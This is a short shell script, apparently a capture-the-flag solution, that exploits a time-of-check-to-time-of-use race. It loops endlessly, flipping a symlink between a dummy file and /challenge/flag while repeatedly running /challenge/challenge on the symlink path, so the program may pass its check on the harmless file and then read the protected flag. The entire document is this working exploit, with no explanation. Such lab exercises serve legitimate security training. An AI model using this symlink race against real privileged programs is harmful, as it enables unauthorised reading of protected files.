rm dummy
rm not_flag
touch dummy
while :
do
    ln -sf dummy not_flag
    echo "/tmp/95562/not_flag" | /challenge/challenge &  
    ln -sf /challenge/flag not_flag
    rm not_flag
done